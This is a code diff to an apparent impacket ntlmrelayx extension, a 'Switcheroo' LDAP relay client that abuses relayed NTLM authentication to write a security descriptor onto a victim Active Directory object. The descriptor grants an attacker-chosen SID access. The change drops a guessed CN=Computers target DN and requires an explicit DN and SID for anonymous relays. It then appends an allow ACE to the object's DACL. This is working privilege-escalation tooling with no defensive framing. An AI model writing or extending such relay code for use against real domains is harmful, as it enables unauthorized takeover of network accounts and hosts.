@@ -514,21 +514,21 @@ class SwitcherooLDAPRelayClient(LDAPRelayClient):
             else:
                 target_dn, grant_sid = self._sw_resolve(victim_user, escalate, sid_flag, explicit_dn)
         else:
-            if not (escalate and sid_flag):
-                # Anonymous X cannot resolve an account name to a SID, so require an explicit SID.
+            # Anonymous X cannot LDAP-search, so it cannot look up the victim's DN or resolve a
+            # grantee account name to a SID. Require both explicitly (or use --switcheroo-creds for
+            # an authenticated X that resolves them). No CN=Computers guessing: a wrong guess would
+            # silently target the wrong/nonexistent object (noSuchObject), so refuse instead.
+            if not explicit_dn:
                 raise LDAPRelayClientException(
-                    "Switcheroo (anonymous X) needs an explicit grantee SID: pass --escalate-user <SID> --sid, "
+                    "anonymous switcheroo requires an explicit target DN; pass --switcheroo-dn <DN> "
+                    "(e.g. 'CN=HOST,CN=Computers,DC=...' or 'CN=DC,OU=Domain Controllers,DC=...'), "
+                    "or use --switcheroo-creds DOMAIN/user:pass to resolve it automatically")
+            if not (escalate and sid_flag):
+                raise LDAPRelayClientException(
+                    "anonymous switcheroo needs an explicit grantee SID: pass --escalate-user <SID> --sid, "
                     "or supply --switcheroo-creds to resolve names automatically")
             grant_sid = escalate
-            if explicit_dn:
-                # Explicit DN lets anonymous X target any object (DC/custom OU) without a search.
-                target_dn = explicit_dn
-            else:
-                if not self._sw_base_dn:
-                    raise LDAPRelayClientException(
-                        "could not determine base DN; pass --switcheroo-dn <DN> explicitly")
-                # No DN given: derive the default-container DN heuristically.
-                target_dn = "CN=%s,CN=Computers,%s" % (victim_user[:-1], self._sw_base_dn)
+            target_dn = explicit_dn
         from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
         descriptor = create_empty_sd()
         descriptor["Dacl"].aces.append(create_allow_ace(grant_sid))
